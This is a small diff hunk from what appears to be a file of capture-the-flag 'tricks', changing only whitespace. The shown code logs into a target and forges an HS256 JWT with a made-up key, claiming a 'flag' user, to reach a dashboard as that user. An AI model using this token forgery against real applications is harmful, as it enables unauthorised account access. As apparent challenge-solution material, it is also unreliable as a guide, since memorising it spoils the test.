@@ -43,12 +43,12 @@ tricks:
       s.post(f"{TARGET}/", data={"username": "test"})
       s.post(f"{TARGET}/password/test", data={"password": "test"})
       session_cookie = s.cookies.get("session")
-      
+
       forged_token = jwt.encode(
           {"username": "flag", "user_id": 10019},
           "fake_key", algorithm="HS256"
       )
-      
+
       resp = s.get(f"{TARGET}/dashboard", cookies={
           "auth_token": forged_token,
           "session": session_cookie
